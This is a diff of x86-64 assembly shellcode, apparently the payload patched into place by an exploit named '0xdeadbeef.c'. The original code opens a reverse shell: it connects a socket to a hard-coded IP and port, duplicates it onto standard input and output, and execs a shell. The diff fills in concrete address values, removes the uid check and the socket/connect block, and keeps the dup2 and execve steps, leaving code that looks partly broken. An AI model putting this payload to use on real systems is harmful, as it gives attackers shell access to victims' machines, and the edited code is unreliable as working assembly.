@@ -15,8 +15,8 @@ SYS_GETUID	equ 0x66
 AF_INET		equ 0x2
 SOCK_STREAM	equ 0x1
 
-IP		equ 0xdeadc0de	;; patched by 0xdeadbeef.c
-PORT		equ 0x1337	;; patched by 0xdeadbeef.c
+IP		equ 251789322 ;; patched by 0xdeadbeef.c
+PORT		equ 53764 ;; patched by 0xdeadbeef.c
 
 _start:
 		;; save registers
@@ -31,10 +31,10 @@ _start:
 		;;
 		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
-		mov	rax, SYS_GETUID
-		syscall
-		test	rax, rax
-		jne	return
+		;mov	rax, SYS_GETUID
+		;syscall
+		;test	rax, rax
+		;jne	return
 
 		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 		;;
@@ -43,21 +43,17 @@ _start:
 		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
     ; 2f646174612f62
-		mov     rsi, 0x00622f617461642f
-		push    rsi
-		mov     rdi, rsp
-		mov     rsi, 192
-		mov     rax, SYS_OPEN
-		syscall
-		test    rax, rax
-		pop     rsi
-		js      return
+		;mov     rsi, 0x00622f617461642f
+		;push    rsi
+		;mov     rdi, rsp
+		;mov     rsi, 192
+		;mov     rax, SYS_OPEN
+		;syscall
+		;test    rax, rax
+		;pop     rsi
+		;js      return
 
 		;; fork
-		mov     rax, SYS_FORK
-		syscall
-		test    rax, rax
-		jne	return
 
 		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 		;;
@@ -66,38 +62,6 @@ _start:
 		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 		;; sockfd = socket(AF_INET, SOCK_STREAM, 0)
-		xor	rsi, rsi	; 0 out rsi
-		mul	esi		; 0 out rax, rdx ; rdx = IPPROTO_IP (int: 0)
-		inc	rsi             ; rsi = SOCK_STREAM
-		push	AF_INET
-		pop	rdi
-		add	al, SYS_SOCKET
-		syscall
-
-		; copy socket descriptor to rdi for future use
-		push	rax
-		pop	rdi
-
-		; server.sin_family = AF_INET
-		; server.sin_port = htons(PORT)
-		; server.sin_addr.s_addr = IP
-		; bzero(&server.sin_zero, 8)
-		push	rdx
-		push	rdx
-		mov	dword [rsp + 0x4], IP
-		mov	word [rsp + 0x2], PORT
-		mov	byte [rsp], AF_INET
-
-		;; connect(sockfd, (struct sockaddr *)&server, sockaddr_len)
-		push	rsp
-		pop	rsi
-		push	0x10
-		pop	rdx
-		push	SYS_CONNECT
-		pop	rax
-		syscall
-		test    rax, rax
-		js      exit
 
 		;; dup2(sockfd, STDIN); dup2(sockfd, STDOUT); dup2(sockfd, STERR)
 		xor	rax, rax
@@ -110,9 +74,6 @@ dup_loop:
 		jne	dup_loop
 
 		;; execve('//bin/sh', NULL, NULL)
-		push	rsi		; *argv[] = 0
-		pop	rdx		; *envp[] = 0
-		push	rsi		; '\0'
 		;;;;mov	rdi, '//system/bin/sh'	; str
 		mov rdi, 'xbin/sh'
 		push rdi
@@ -131,7 +92,7 @@ dup_loop:
 		mov	al, SYS_EXECVE
 		syscall
 
-    mov rdi, 7 ; rdi is exit code
+    mov rdi, 7
 
 exit:
 		xor	rax, rax
@@ -139,6 +100,7 @@ exit:
 		syscall
 
 return:
+    mov rdi, 9
 		;; restore registers
 		pop	rcx
 		pop     rdx
